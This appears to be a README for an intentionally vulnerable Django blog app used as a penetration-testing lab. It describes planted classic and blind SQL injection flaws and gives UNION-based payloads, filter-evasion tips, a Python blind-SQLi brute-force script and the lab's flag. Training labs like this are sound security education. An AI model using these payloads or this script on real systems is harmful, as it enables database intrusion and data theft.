âš ï¸ This project is for **educational and research purposes only**. Do not deploy or test on unauthorized systems.


![](https://github.com/Mgh-Zakariae/Vulnerable_web_app/blob/a2bc46fed71a22c0e9b3f115a37222c964a269ec/images/2025-03-30%2015_57_44-WhatsApp.png)
# Vulnerable Blog Web Application (Docker)

This project is a vulnerable **blog web application** designed for **web penetration testing**. It is built using **Django**, with **MariaDB** as the database , all containerized using **Docker**.

## ðŸš¨ Vulnerabilities

### 1ï¸âƒ£ SQL Injection (Classic SQLi)
- A classic **SQL Injection vulnerability** is present in the details posts functionality.
### 2ï¸âƒ£ Blind SQL Injection (ORDER BY Exploit)
- A **Blind SQL Injection** vulnerability exists in an `ORDER BY` clause.
- Since the response does not directly return database content, attackers must infer information by analyzing server behavior.

## ðŸ—ï¸ Setup Instructions

1. **Clone the repository**  
  ```bash
   git clone https://github.com/Mgh-Zakariae/Vulnerable_web_app.git
   cd Vulnerable_web_app
```

1. **Build and run the Docker containers** : `sudo docker-compose up --build`
>You must ensure you have **Docker** and **docker-compose** installed. install docker

2. **Access the web application**  
    Open your browser and navigate to: http://localhost:8000

---
## ðŸŽ¯Exploitation Guide
### Classic SQL Injection

1. **Identify the Vulnerability**:
    - The application has an input field in http://localhost:8000/posts/my_posts/details/?id=18 that is vulnerable to SQL injection.
    - You can test this by entering a single quote (`'`) and observing if the application throws an error or behaves unexpectedly.
![](https://github.com/Mgh-Zakariae/Vulnerable_web_app/blob/a2bc46fed71a22c0e9b3f115a37222c964a269ec/images/2025-03-30%2015_58_54-Post%20Details%20-%20Brave.png)
2. **Manual Exploitation**:
    - Instead of using automated tools likeÂ `sqlmap`, you can exploit the vulnerability manually.
    - The application is vulnerable toÂ **Union-Based SQL Injection**.

3. **Enumerate the Database**:
    - Use a payload to determine the number of columns. For example:
        - **Using `UNION SELECT`**:
		- inject `NULL` values until the number of columns matches.
		- The query that does not produce an error reveals the number of columns.
```sql
  ' UNION SELECT NULL--
  ' UNION SELECT NULL, NULL--
  ' UNION SELECT NULL, NULL, NULL--
```
- Use a payload to enumerate the database schema. For example:
		`' UNION SELECT NULL,NULL,...,schema_name FROM INFORMATION_SCHEMA.SCHEMATA-- -`
	>it only work if you add number of null values that match the number of columns

4. Detect if there is a filter:
	- After doing the previous step, you may notice that everything is not working, because there is a filter. you need to apply one of the filter evasion techniques.
		- you can try URL Encoding,  Hexadecimal Encoding, changing the case of SQL keywords like sEleT , fRoM ....

5. **Find the Flag Table**:
    
    - Once you know the method to bypass filter, the database name, the number of columns, enumerate the tables:
        
        ```
        ' UNION SELECT NULL,NULL,....,table_name FROM INFORMATION_SCHEMA.TABLES WHERE table_schema='database_name' -- -
        ```
        
    - Look for a table namedÂ `flag`.
6. **Retrieve the Flag**:
    
    - TheÂ `flag`Â table contains a column namedÂ `flag`. Use the following payload to retrieve the flag:
        
        ```
        ' UNION SELECT NULL,NULL,.....,flag FROM flag -- -
        ```
    - The application will return the flag.
	- flag is `MGHFLAG{d1g1t4l_gh0st_Good_Job_7r4ck3r_9071}`

---
### Blind SQL Injection

1. **Identify the Vulnerability**:
	- The application has an input field in http://localhost:8000/posts/my_posts?sort=date that is vulnerable to Blind SQL injection.
    - You can test this by entering a` title desc -- -` and observing if the application behaves unexpectedly
![](https://github.com/Mgh-Zakariae/Vulnerable_web_app/blob/a2bc46fed71a22c0e9b3f115a37222c964a269ec/images/2025-03-30%2015_59_28-my%20Posts%20-%20Brave.png)
2. Manual Exploitation:
	-  you can use the following query that used with `order by` to found the flag : 
		- `CASE WHEN (select SUBSTRING(flag,0,lengh) from flag) = 'char' THEN title ELSE Date END `
	- if the web site sort the posts with *title* that means the character is correct (it's the first char. from the flag) , 
>			- SUBSTRING(column, start_position, length) :
>			- TheÂ `SUBSTRING`Â function extracts a portion of a string.
>			- Syntax:Â `SUBSTRING(string, start_position, length)`
>			- Example:Â `SUBSTRING('hello', 2, 3)` ,returnsÂ `'ell'`.

1. Automation of exploitation:
	-  to exploit this vulnerability by this query , we write a [script](https://github.com/Mgh-Zakariae/Vulnerable_web_app/blob/b9b8f4ee46fc00aefbd1ed0e0de61f1d2fab4387/exploitation_script.py)Â to automate the process 
	- This script is an **automated Blind SQL Injection exploit** that brute-forces a flag character by character using the `ORDER BY` clause. It works by:
		1. **Generating a character set** (`array`) containing letters, numbers, and special symbols.
		2. **Sending an initial request** to determine the response when ordering by `title`.
		3. **Iterating through possible flag lengths (1 to 40 characters)** and testing each character in `array`.
		4. **Using a conditional SQL query** (`CASE WHEN ... THEN title ELSE category END`) to check if the substring of the flag matches the guessed characters.
		5. **Comparing responses**: If the response matches the original request with `title`, the guessed character is correct, and it is added to the `flag`.
		6. **Printing the extracted flag progressively** until fully retrieved.
```python
import string
import requests
import urllib.parse

# Create an array with all letters and numbers
array = list(string.ascii_letters + string.digits)
array.extend(list("{}()_-$@!#"))

url = "http://localhost:3000/posts/my_posts?sort="

# Define the session ID (replace with your actual session ID)
# we use this line to bypass the login check 
#example : cookies = {"sessionid": "wtncl32u1y4820dw6a1v9463x6gb5ewz"} 
cookies = {"sessionid": "__ADD_YOUR_SESSIONID_HERE__"}

req_with_title = requests.get(url + "title", cookies=cookies).text

flag = ""
print("#### Start Exploit")

for i in range(1, 40):
    for l in array:
        payload = f"CASE WHEN (select BINARY SUBSTRING(flag,1,{i}) from flag) = '{flag+l}' THEN title ELSE category END"
        encoded_payload = urllib.parse.quote_plus(payload)  # Encode the payload properly

        req = requests.get(url + encoded_payload, cookies=cookies)
        if req.text == req_with_title:
            flag += l
            print(f"Current flag: {flag}")
            break
    if flag[-1] == '}':
        break

print(f"Final flag: {flag}")
```
> you can modify this script to enumerate more information about database , for example to enumerate name of database you can use this payload : `payload = f"CASE WHEN (select BINARY SUBSTRING(database(),1,{i})) = '{flag+l}' THEN title ELSE category END`

- its output is  : 
```bash
Final flag: MGHFLAG{d1g1t4l_gh0st_Good_Job_7r4ck3r_9071}
```


ðŸ”— **GitHub:** [https://github.com/Mgh-Zakariae/Vulnerable_web_app.git] 
